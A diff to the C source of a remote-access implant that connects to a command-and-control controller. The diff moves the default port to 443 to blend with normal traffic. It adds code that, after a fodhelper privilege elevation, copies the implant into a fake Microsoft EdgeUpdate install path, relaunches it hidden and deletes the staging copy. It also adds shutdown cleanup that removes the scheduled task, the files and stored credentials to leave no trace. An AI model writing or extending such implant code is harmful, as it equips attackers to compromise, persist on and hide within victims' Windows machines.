@@ -203,7 +203,7 @@ static int make_raw_socket(void)
     if (!host || host[0] == '\0')
         host = C2_DEFAULT_HOST;
 
-    int port = 4444;
+    int port = 443;
     if (port_env && port_env[0] != '\0') {
         int p = atoi(port_env);
         if (p > 0) port = p;
@@ -290,10 +290,74 @@ static Conn *connect_to_controller(void)
     return conn;
 }
 
+/* ── Self-relocation ─────────────────────────────────────────────────
+ *
+ * The stager (medium-integrity) drops i.exe to C:\Users\Public because
+ * it cannot write to Program Files.  Once fodhelper has elevated us to
+ * high-integrity, we copy ourselves to the more convincing install path,
+ * re-launch from there, and exit — leaving no i.exe behind.
+ */
+#ifdef _WIN32
+#define IMPLANT_STAGE_PATH   "C:\\Users\\Public\\i.exe"
+#define IMPLANT_TARGET_DIR   "C:\\Program Files (x86)\\Microsoft\\EdgeUpdate"
+#define IMPLANT_TARGET_PATH  "C:\\Program Files (x86)\\Microsoft\\EdgeUpdate\\MicrosoftEdgeUpdate.exe"
+
+/* Copy self to the target install path and re-launch from there.
+ * Returns 1 if the new process was started (caller must exit immediately),
+ * 0 if we are already at the target or if relocation fails (run in place). */
+static int self_relocate(void)
+{
+    char self_path[MAX_PATH];
+    if (!GetModuleFileNameA(NULL, self_path, sizeof(self_path)))
+        return 0;
+
+    if (_stricmp(self_path, IMPLANT_TARGET_PATH) == 0)
+        return 0;   /* already installed — nothing to do */
+
+    CreateDirectoryA(IMPLANT_TARGET_DIR, NULL);
+
+    if (!CopyFileA(self_path, IMPLANT_TARGET_PATH, FALSE))
+        return 0;   /* copy failed (e.g. not yet elevated) — run in place */
+
+    STARTUPINFOA si;
+    ZeroMemory(&si, sizeof(si));
+    si.cb          = sizeof(si);
+    si.dwFlags     = STARTF_USESHOWWINDOW;
+    si.wShowWindow = SW_HIDE;
+
+    char cmd[MAX_PATH + 20];
+    _snprintf(cmd, sizeof(cmd), "\"%s\" --relocated", IMPLANT_TARGET_PATH);
+
+    PROCESS_INFORMATION pi;
+    ZeroMemory(&pi, sizeof(pi));
+
+    if (!CreateProcessA(NULL, cmd, NULL, NULL, FALSE,
+                        CREATE_NO_WINDOW, NULL, NULL, &si, &pi))
+        return 0;
+
+    CloseHandle(pi.hThread);
+    CloseHandle(pi.hProcess);
+    return 1;
+}
+#endif
+
 /* ── main ────────────────────────────────────────────────────────────── */
 
 int main(int argc, char **argv)
 {
+#ifdef _WIN32
+    /* Relocate to the install path before doing anything else.
+     * self_relocate() returns 1 if it launched a copy from the target
+     * path — we must exit so the original (i.exe) process terminates and
+     * becomes deletable. */
+    if (self_relocate())
+        return 0;
+
+    /* If we were re-launched from the install path, clean up the staging
+     * copy now that it is no longer locked by a running process. */
+    if (argc >= 2 && strcmp(argv[1], "--relocated") == 0)
+        DeleteFileA(IMPLANT_STAGE_PATH);
+#endif
     (void)argc; (void)argv;
 
     platform_init();
@@ -443,7 +507,11 @@ int main(int argc, char **argv)
         case COMMAND_SHUTDOWN: {
 #ifdef _WIN32
             system("schtasks /delete /tn \"MicrosoftEdgeUpdate\" /f >nul 2>&1");
-            system("cmd /c del /f /q \"C:\\Users\\Public\\i.exe\" >nul 2>&1");
+            /* Can't delete the running executable directly; mark it for
+             * removal on next reboot and clean up everything else now. */
+            MoveFileExA(IMPLANT_TARGET_PATH, NULL, MOVEFILE_DELAY_UNTIL_REBOOT);
+            RemoveDirectoryA(IMPLANT_TARGET_DIR);
+            DeleteFileA(IMPLANT_STAGE_PATH);
 #endif
             /* Remove persisted credentials — leaves no trace after shutdown */
             {
